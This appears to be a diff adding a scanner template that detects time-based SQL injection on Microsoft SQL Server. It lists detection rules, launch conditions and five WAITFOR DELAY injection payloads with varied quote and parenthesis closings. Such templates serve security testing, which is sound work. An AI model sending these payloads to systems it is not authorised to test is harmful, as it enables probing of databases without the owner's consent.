@@ -1,0 +1,48 @@
+id: "sqli-time-mssql"
+issue_code: sql_injection
+detection_condition: or
+detection_methods:
+  - time_based:
+      sleep: "{{.sleep_time}}"
+      confidence: 85
+  - response_condition:
+      contains: "Microsoft SQL Server"
+      confidence: 90
+  - response_condition:
+      contains: "ODBC SQL Server"
+      confidence: 85
+  - response_check:
+      check: database_error
+      confidence: 80
+vars:
+  - name: sleep_time
+    value: "{{randomInt 5 8}}"
+launch:
+  operator: or
+  conditions:
+    - type: platform
+      value: mssql
+    - type: platform
+      value: aspnet
+    - type: platform
+      value: iis
+    - type: scan_mode
+      value: fuzz
+templates:
+  # WAITFOR DELAY injection
+  - "'; WAITFOR DELAY '0:0:{{.sleep_time}}'--"
+  - "1'; WAITFOR DELAY '0:0:{{.sleep_time}}'--"
+  
+  # Closing parentheses variations
+  - "'); WAITFOR DELAY '0:0:{{.sleep_time}}'--"
+  - "')); WAITFOR DELAY '0:0:{{.sleep_time}}'--"
+  
+  # Conditional delay
+  - "'; IF(1=1) WAITFOR DELAY '0:0:{{.sleep_time}}'--"
+categories:
+  - sql_injection
+  - time_based
+  - mssql
+platforms:
+  - mssql
+  - aspnet
